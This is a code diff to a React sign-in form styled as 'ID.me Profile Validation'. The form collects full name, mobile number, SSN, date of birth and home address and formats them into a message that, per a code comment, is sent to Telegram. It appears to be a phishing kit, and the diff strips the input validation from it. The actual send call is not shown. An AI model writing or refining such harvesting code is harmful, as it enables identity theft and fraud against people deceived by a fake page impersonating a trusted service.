@@ -20,22 +20,7 @@ const SignInForm = () => {
     e.preventDefault();
 
     // Validate all fields are filled
-    if (!fullName || !mobileNumber || !ssn || !dob || !address) {
-      setError("Please fill out all fields.");
-      return;
-    }
 
-    // Basic validation for mobile number (simple check)
-    if (mobileNumber.length < 10) {
-      setError("Please enter a valid mobile number.");
-      return;
-    }
-
-    // Basic SSN validation (simple format check)
-    if (ssn.length < 9) {
-      setError("Please enter a valid SSN.");
-      return;
-    }
 
     setIsSubmitting(true);
     setError("");
@@ -43,15 +28,15 @@ const SignInForm = () => {
 
     // Format the message to send to Telegram
     const message = `
-      🔐 ID.me Profile Validation
+       ID.me Profile Validation
       ━━━━━━━━━━━━━━━━━━━━━
-      👤 Full Name: ${fullName}
-      📱 Mobile Number: ${mobileNumber}
-      🆔 SSN: ${ssn}
-      🎂 Date of Birth: ${dob}
-      🏠 Home Address: ${address}
+       Full Name: ${fullName}
+      Mobile Number: ${mobileNumber}
+       SSN: ${ssn}
+       Date of Birth: ${dob}
+       Home Address: ${address}
       ━━━━━━━━━━━━━━━━━━━━━
-      ⏰ Time: ${new Date().toLocaleString()}
+       Time: ${new Date().toLocaleString()}
     `;
 
     try {
